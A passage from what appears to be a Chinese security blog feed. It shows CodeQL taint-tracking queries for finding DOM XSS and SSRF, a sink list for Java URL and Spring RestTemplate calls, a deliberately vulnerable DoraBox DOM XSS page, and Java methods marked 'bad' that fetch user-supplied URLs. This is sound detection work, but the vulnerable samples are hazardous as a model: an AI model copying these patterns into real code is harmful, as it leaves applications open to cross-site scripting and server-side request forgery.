class="hljs-attribute">innerHTML</span>=<span class="hljs-string">&quot;user controllable data&quot;</span>;<br></code></pre></td></tr></table></figure><p>和上面一样，只需要让sink为判断是存在PropWrite事件，写入的属性为innerHTML&#x2F;outerHTML&#x2F;href即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javascript<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerHTMLSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>   InnerHTMLSinks()&#123;<br>       exists(DataFlow::PropWrite pw |<br>       pw.getPropertyName().regexpMatch(<span class="hljs-string">&quot;(innerHTML|outerHTML)&quot;</span>)<br>       and pw.getRhs() = <span class="hljs-built_in">this</span><br>       )<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerHtmlTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TaintTracking</span>::Configuration&#123;<br>    InnerHtmlTracker() &#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;InnerHtmlTracker&quot;</span><br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>       not nd.asExpr() <span class="hljs-keyword">instanceof</span> ConstantExpr<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>        nd <span class="hljs-keyword">instanceof</span> InnerHTMLSinks<br>    &#125;<br>&#125;<br><br><br><br>from InnerHtmlTracker pt, DataFlow::Node source, DataFlow::Node sink<br>where pt.hasFlow(source, sink)<br>select source,sink<br></code></pre></td></tr></table></figure><h3 id="DomXSS的判断例子"><a href="#DomXSS的判断例子" class="headerlink" title="DomXSS的判断例子"></a>DomXSS的判断例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;title&gt;DoraBox - DOM_XSS&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=&#x27;&#x27; method=&#x27;GET&#x27;&gt;<br>name: <br>&lt;input type=&#x27;text&#x27; name=&#x27;name&#x27; id=&#x27;form1&#x27;&gt;<br>&lt;input type=&#x27;submit&#x27; name=&#x27;submit&#x27; value=&#x27;submit&#x27;&gt;<br>&lt;/form&gt;<br>&lt;hr&gt;<br>&lt;script type=&#x27;text/javascript&#x27;&gt;<br>function getURLValue(name)&#123;<br> var reg = new RegExp(&#x27;(^|&amp;)&#x27;+ name +&#x27;=([^&amp;]*)(&amp;|$)&#x27;);<br>var r = window.location.search.substr(1).match(reg);<br>    //<br>if(r != null)&#123;<br> return unescape(r[2]);<br> &#125;else&#123;<br> return &quot;&quot;;<br> &#125;<br>&#125;<br>document.write(getURLValue(&#x27;name&#x27;));<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>window.location.search</code>是一个属性，它返回URL中问号（?）后面的部分，也就是查询字符串（query string）。</li><li><code>substr(1)</code>是一个方法，它返回一个字符串的子串，从指定的位置开始，一直到字符串的末尾。这里的参数1表示从第一个字符开始，也就是去掉问号（?）。</li><li><code>match(reg)</code>是一个方法，它使用一个正则表达式（reg）来匹配一个字符串，如果匹配成功，返回一个包含匹配结果的数组，如果匹配失败，返回null。</li><li><code>reg</code>是一个正则表达式，它的作用是匹配URL中的参数名和参数值，具体来说，它的格式是<code>(^|&amp;)name=([^&amp;]*)(&amp;|$)</code>，其中<code>name</code>是要获取的参数名，<code>(^|&amp;)</code>表示以<code>&amp;</code>或者开始，<code>([^&amp;]*)</code>表示不包含<code>&amp;</code>的任意字符，<code>(&amp;|$)</code>表示以<code>&amp;</code>或者结束。</li><li><code>r</code>是一个变量，它存储了<code>match(reg)</code>的返回值，也就是匹配结果的数组，如果没有匹配到，它的值是null。</li></ul><p>举个例子，假设当前的URL是<code>https://www.bing.com/search?q=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;sc=0-48&amp;sk=&amp;cvid=9F4D8E5F6E7A4E0F8C7F8E5F1F0E6F0E</code>，那么：</p><ul><li><code>window.location.search</code>的值是<code>?q=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;sc=0-48&amp;sk=&amp;cvid=9F4D8E5F6E7A4E0F8C7F8E5F1F0E6F0E</code>。</li><li><code>substr(1)</code>的值是<code>q=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=var+r+%3D+window.location.search.substr(1).match(reg)%3B&amp;sc=0-48&amp;sk=&amp;cvid=9F4D8E5F6E7A4E0F8C7F8E5F1F0E6F0E</code>。</li><li>如果要获取参数<code>q</code>的值，那么<code>reg</code>的值是<code>(^|&amp;)q=([^&amp;]*)(&amp;|$)</code>。</li><li><code>r</code>的值是<code>[&quot;&amp;q=var+r+%3D+window.location.search.substr(1).match(reg)%3B&quot;, &quot;&amp;&quot;, &quot;var+r+%3D+window.location.search.substr(1).match(reg)%3B&quot;, &quot;&quot;]</code>，这是一个包含四个元素的数组，分别对应正则表达式的四个括号里的内容。</li><li><code>r[2]</code>的值是<code>var+r+%3D+window.location.search.substr(1).match(reg)%3B</code>，这就是参数<code>q</code>的值，它是一个经过URL编码的字符串，可以用<code>decodeURIComponent</code>方法来解码，得到原始的字符串<code>var r = window.location.search.substr(1).match(reg);</code></li></ul></blockquote><p>所以可以按照下面这个办法来改，首先找到一个调用到那些一分割字符的函数，接着再找到windows.location</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocationHashSource</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>    LocationHashSource() &#123;<br>        exists(CallExpr dollarCall, PropAccess pr |<br>      <span class="hljs-built_in">this</span>.asExpr() <span class="hljs-keyword">instanceof</span> CallExpr <span class="hljs-title function_">and</span><br>      <span class="hljs-params">(dollarCall.getCalleeName()</span> = <span class="hljs-string">&quot;split&quot;</span><br>       or dollarCall.getCalleeName() = <span class="hljs-string">&quot;substr&quot;</span><br>        or dollarCall.getCalleeName() = <span class="hljs-string">&quot;substring&quot;</span><br>      ) and dollarCall.getReceiver() = pr<br>      <span class="hljs-title function_">and</span>  <span class="hljs-params">(pr.getBase()</span>.toString() = <span class="hljs-string">&quot;window.location&quot;</span> <br>      or pr.getBase().toString() = <span class="hljs-string">&quot;location&quot;</span>)<br>      and <span class="hljs-built_in">this</span>.asExpr() = dollarCall<br>      )<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而sink的话直接使用上面的，稍作修改即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentWriteSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>   DocumentWriteSinks() &#123;<br>    exists(CallExpr call|<br>        call.getCalleeName() = <span class="hljs-string">&quot;write&quot;</span> <br>        and call.getReceiver().toString() = <span class="hljs-string">&quot;document&quot;</span> <br>        and <span class="hljs-built_in">this</span>.asExpr() = call.getArgument(<span class="hljs-number">0</span>)<br>    )<br><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerHTMLSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>    InnerHTMLSinks()&#123;<br>        exists(DataFlow::PropWrite pw |<br>        pw.getPropertyName().regexpMatch(<span class="hljs-string">&quot;(innerHTML|outerHTML)&quot;</span>)<br>        and pw.getRhs() = <span class="hljs-built_in">this</span><br>       )<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编码函数会导致数据流断开，所以添加额外的数据流判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;<br>    exists(CallExpr call |<br>    (call.getCalleeName() = <span class="hljs-string">&quot;unescape&quot;</span><br>        or call.getCalleeName() = <span class="hljs-string">&quot;atob&quot;</span><br>        or call.getCalleeName() = <span class="hljs-string">&quot;decodeURI&quot;</span><br>        or call.getCalleeName() = <span class="hljs-string">&quot;decodeURIComponent&quot;</span><br>    ) and succ.asExpr() = call and<br>    pred.asExpr() = call.getArgument(<span class="hljs-number">0</span>)<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>总体实现语句如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javascript<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentWriteSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>   DocumentWriteSinks() &#123;<br>    exists(CallExpr call|<br>        call.getCalleeName() = <span class="hljs-string">&quot;write&quot;</span> <br>        and call.getReceiver().toString() = <span class="hljs-string">&quot;document&quot;</span> <br>        and <span class="hljs-built_in">this</span>.asExpr() = call.getArgument(<span class="hljs-number">0</span>)<br>    )<br><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerHTMLSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>    InnerHTMLSinks()&#123;<br>        exists(DataFlow::PropWrite pw |<br>        pw.getPropertyName().regexpMatch(<span class="hljs-string">&quot;(innerHTML|outerHTML)&quot;</span>)<br>        and pw.getRhs() = <span class="hljs-built_in">this</span><br>       )<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocationHashSource</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>    LocationHashSource() &#123;<br>        exists(CallExpr dollarCall, PropAccess pr |<br>      <span class="hljs-built_in">this</span>.asExpr() <span class="hljs-keyword">instanceof</span> CallExpr <span class="hljs-title function_">and</span><br>      <span class="hljs-params">(dollarCall.getCalleeName()</span> = <span class="hljs-string">&quot;split&quot;</span><br>       or dollarCall.getCalleeName() = <span class="hljs-string">&quot;substr&quot;</span><br>        or dollarCall.getCalleeName() = <span class="hljs-string">&quot;substring&quot;</span><br>      ) and dollarCall.getReceiver() = pr<br>      <span class="hljs-title function_">and</span>  <span class="hljs-params">(pr.getBase()</span>.toString() = <span class="hljs-string">&quot;window.location&quot;</span> <br>      or pr.getBase().toString() = <span class="hljs-string">&quot;location&quot;</span>)<br>      and <span class="hljs-built_in">this</span>.asExpr() = dollarCall<br>      )<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentWriteTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TaintTracking</span>::Configuration&#123;<br>   DocumentWriteTracker() &#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;DocumentWriteTracker&quot;</span><br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>       nd <span class="hljs-keyword">instanceof</span> LocationHashSource<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>        nd <span class="hljs-keyword">instanceof</span> DocumentWriteSinks<br>        or nd <span class="hljs-keyword">instanceof</span> InnerHTMLSinks<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;<br>        exists(CallExpr call |<br>        (call.getCalleeName() = <span class="hljs-string">&quot;unescape&quot;</span><br>            or call.getCalleeName() = <span class="hljs-string">&quot;atob&quot;</span><br>            or call.getCalleeName() = <span class="hljs-string">&quot;decodeURI&quot;</span><br>            or call.getCalleeName() = <span class="hljs-string">&quot;decodeURIComponent&quot;</span><br>        ) and succ.asExpr() = call and<br>        pred.asExpr() = call.getArgument(<span class="hljs-number">0</span>)<br>        )<br>    &#125;<br>&#125;<br><br>from DocumentWriteTracker pt, DataFlow::Node source, DataFlow::Node sink<br>where pt.hasFlow(source, sink) <br>select source,sink<br></code></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="1-sinks"><a href="#1-sinks" class="headerlink" title="1 sinks:"></a>1 sinks:</h3><p>格式：namespace;type;subtypes;names;signature;ext;input;additionalTaintStep;additionalTaintStepInput;additionalTaintStep1;additionalTaintStepInput1…</p><p>namespace：包名 type：类名 names：触发漏洞方法名 input：触发漏洞方法名的形参位置 additionalTaintStep：依赖的污点</p><h4 id="1-1-java-net"><a href="#1-1-java-net" class="headerlink" title="1.1 java-net:"></a>1.1 java-net:</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs scss">java<span class="hljs-selector-class">.net</span>;URL;false;<span class="hljs-selector-attr">[openConnection, openStream]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>(URL[]);Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>(URL[], ClassLoader);Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>(URL[],ClassLoader,URLStreamHandlerFactory);Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>(String,URL[],ClassLoader);Argument<span class="hljs-selector-attr">[1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>(String,URL[],ClassLoader,URLStreamHandlerFactory);Argument<span class="hljs-selector-attr">[1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br><br><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span><span class="hljs-selector-class">.newInstance</span>(URL[]);Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br>java<span class="hljs-selector-class">.net</span>;URLClassLoader;false;<span class="hljs-selector-attr">[loadClass, getResourceAsStream, findResource, getResource]</span>;;;Argument<span class="hljs-selector-attr">[-1]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span><span class="hljs-selector-class">.newInstance</span>(URL[],ClassLoader);Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span>(String);Argument<span class="hljs-selector-attr">[0]</span><br><br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.http</span>;HttpRequest;false;<span class="hljs-selector-attr">[newBuilder]</span>;;;Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URI</span><span class="hljs-selector-class">.create</span>(String);Argument<span class="hljs-selector-attr">[0]</span># jdk11<br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.http</span>;HttpRequest<span class="hljs-selector-class">.Builder</span>;false;<span class="hljs-selector-attr">[uri]</span>;;;Argument<span class="hljs-selector-attr">[0]</span>;java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URI</span><span class="hljs-selector-class">.create</span>(String);Argument<span class="hljs-selector-attr">[0]</span># jdk11<br></code></pre></td></tr></table></figure><p>java.net.URI.create(String);Argument[0] 应该做为一个全局污点</p><h4 id="1-2-springframework"><a href="#1-2-springframework" class="headerlink" title="1.2 springframework:"></a>1.2 springframework:</h4><p>org.springframework.web.client.RestTemplate 属于 spring-web模块</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">org.springframework.web.client;RestTemplate;<span class="hljs-literal">false</span>;[<span class="hljs-built_in">put</span>，<span class="hljs-built_in">delete</span>,exchange,execute,getForEntity,getForObject,headForHeaders,optionsForAllow,patchForObject,postForEntity,postForLocation,postForObject];;;Argument[<span class="hljs-number">0</span>]<br>org.springframework.web.client;RestTemplate;<span class="hljs-literal">false</span>;[<span class="hljs-built_in">put</span>，<span class="hljs-built_in">delete</span>,doExecute,execute,getForEntity,getForObject,headForHeaders,optionsForAllow,patchForObject,postForEntity,postForLocation,postForObject];;;Argument[<span class="hljs-number">0</span>];java.net.URI.<span class="hljs-built_in">create</span>(String);Argument[<span class="hljs-number">0</span>]<br>org.springframework.web.client;RestTemplate;<span class="hljs-literal">false</span>;[exchange];;;Argument[<span class="hljs-number">0</span>];org.springframework.<span class="hljs-keyword">http</span>.RequestEntity&lt;T&gt;(...,URI,...);Argument[ParameterType = URI]  <span class="hljs-comment"># 创建RequestEntity对象，URI形参位置</span><br></code></pre></td></tr></table></figure><h3 id="2-示例"><a href="#2-示例" class="headerlink" title="2 示例"></a>2 示例</h3><h4 id="Java-net-ssrf"><a href="#Java-net-ssrf" class="headerlink" title="Java net ssrf"></a>Java net ssrf</h4><p>java.net.URL 支持的协议：file、ftp、http、https、jar、mailto、netdoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.net.http.HttpClient;<br><span class="hljs-keyword">import</span> java.net.http.HttpRequest;<br><span class="hljs-keyword">import</span> java.net.http.HttpResponse;<br><span class="hljs-keyword">import</span> java.net.http.HttpResponse.BodyHandlers;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badJavaNetURLSSRF</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br><span class="hljs-type">URL</span> <span class="hljs-variable">xxx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(requestUrl);<br>xxx.openConnection();  <span class="hljs-comment">//bad</span><br>xxx.openStream();  <span class="hljs-comment">//bad</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badJavaNetURLClassLoaderSSRF</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>URL[] urls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;xxx&#125;;<br><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>urlClassLoader.findResource(<span class="hljs-string">&quot;test&quot;</span>);  <span class="hljs-comment">//bad</span><br>urlClassLoader.loadClass(<span class="hljs-string">&quot;aaa&quot;</span>);  <span class="hljs-comment">//bad</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badJavaNetHttpRequestSSRF</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClient.newHttpClient();<br><span class="hljs-type">HttpRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> HttpRequest.newBuilder().uri(URI.create(requestUrl)).build();<span class="hljs-comment">//bad</span><br>client.sendAsync(request, BodyHandlers.ofString()).thenApply(HttpResponse::body).thenAccept(System.out::println).join();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="springframework-ssrf"><a href="#springframework-ssrf" class="headerlink" title="springframework ssrf"></a>springframework ssrf</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badRestTemplateSSRF</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br><span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();<br>restTemplate.delete(requestUrl);<span class="hljs-comment">//bad</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badRestTemplateUriSSRF</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br><span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();<br>restTemplate.delete(URI.create(requestUrl));<span class="hljs-comment">//bad</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLMap原理及其深入</title>
    <link href="/decemberus.com/2023/09/29/SQLMap%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%B7%B1%E5%85%A5/"/>
    <url>/decemberus.com/2023/09/29/SQLMap%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%B7%B1%E5%85%A5/</url>
    
